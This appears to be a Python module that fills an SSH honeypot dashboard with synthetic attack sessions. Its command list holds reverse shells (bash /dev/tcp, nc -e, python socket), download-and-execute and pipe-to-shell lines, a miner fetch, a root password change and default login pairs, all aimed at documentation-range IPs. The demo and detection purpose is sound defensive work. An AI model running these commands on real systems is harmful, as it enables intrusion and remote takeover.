"""Синтетические данные для демонстрации дашборда. IP только из документационных диапазонов."""
import json
import random
import time

from . import patterns
from .store import Store

CREDS = [
    ("root", "root"), ("root", "123456"), ("admin", "admin"), ("root", "password"), ("ubuntu", "ubuntu"),
    ("pi", "raspberry"), ("root", "toor"), ("test", "test"), ("oracle", "oracle"), ("user", "user"),
    ("root", "admin123"), ("postgres", "postgres"), ("git", "git"), ("root", "qwerty"),
]
CLIENTS = ["SSH-2.0-libssh_0.9.6", "SSH-2.0-Go", "SSH-2.0-paramiko_3.4.0", "SSH-2.0-PuTTY_Release_0.70", "SSH-2.0-OpenSSH_8.4p1"]
SCRIPTS = [
    ["uname -a", "cat /proc/cpuinfo", "free -m", "nproc"],
    ["cd /tmp; wget http://{ip}/x86.sh; chmod +x x86.sh; ./x86.sh", "rm -rf x86.sh"],
    ["curl -s http://{ip}/i.sh | sh"],
    ["whoami", "id", "uname -s -m", "cat /etc/passwd", "ls -la /root"],
    ["cd /tmp; wget http://{ip}/.xmr; chmod +x .xmr; ./.xmr", "crontab -l", "ps"],
    ["echo root:Pw0rned | chpasswd", "ls -la ~/.ssh", "history"],
    ["uname -a"],
    ["bash -i >& /dev/tcp/{ip}/4444 0>&1"],
    ["id", "nc -e /bin/sh {ip} 9001"],
    ["sudo -l", "find / -perm -4000 2>/dev/null", "cd /tmp; wget http://{ip}/linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh"],
    ["whoami", "python3 -c 'import socket,os;s=socket.socket();s.connect((\"{ip}\",4444));os.dup2(s.fileno(),0)'"],
    ["ifconfig", "df -h", "uptime", "w"],
]
NETS = ["203.0.113", "198.51.100", "192.0.2"]


def seed(db_path, sessions=420, hours=48, seed_value=13):
    rng = random.Random(seed_value)
    store = Store(db_path)
    db = store.db
    now = time.time()
    ips = [f"{rng.choice(NETS)}.{rng.randint(2, 250)}" for _ in range(55)]
    weights = [1 / (i + 1) for i in range(len(ips))]
    for _ in range(sessions):
        ip = rng.choices(ips, weights)[0]
        burst = rng.random() < 0.35
        started = now - rng.random() * hours * 3600
        if burst:
            started = now - (rng.choice([3, 11, 27]) + rng.random()) * 3600
        user, pw = rng.choice(CREDS)
        got_in = rng.random() < 0.6
        cur = db.execute(
            "INSERT INTO sessions (started, ended, src_ip, src_port, client_version, username, password, authed) "
            "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
            (started, started + rng.randint(2, 90), ip, rng.randint(1024, 65000), rng.choice(CLIENTS),
             user if got_in else None, pw if got_in else None, int(got_in)),
        )
        sid = cur.lastrowid
        t = started

        def ev(kind, data):
            nonlocal t
            t += rng.random() * 2 + 0.2
            db.execute(
                "INSERT INTO events (session_id, ts, kind, data) VALUES (?, ?, ?, ?)",
                (sid, t, kind, json.dumps(data, ensure_ascii=False)),
            )

        for u, p in rng.sample(CREDS, rng.randint(0 if got_in else 1, 2)):
            ev("auth", {"username": u, "password": p, "ok": False})
        if not got_in:
            continue
        ev("auth", {"username": user, "password": pw, "ok": True})
        payload_ip = f"{rng.choice(NETS)}.{rng.randint(2, 250)}"
        for line in rng.choice(SCRIPTS):
            line = line.format(ip=payload_ip)
            ev("command", {"cmd": line})
            for kind, data in patterns.detect(line):
                ev(kind, data)
            if "http://" in line:
                url = line.split("http://")[1].split()[0].split(";")[0].split("|")[0].strip()
                ev("url", {"url": "http://" + url, "cmd": line})
                if "wget" in line:
                    ev("download", {"url": "http://" + url, "saved_as": url.rsplit("/", 1)[-1]})
            if "| sh" in line:
                ev("pipe_to_shell", {"source": line.split("|")[0].strip()})
    db.commit()
    store.close()
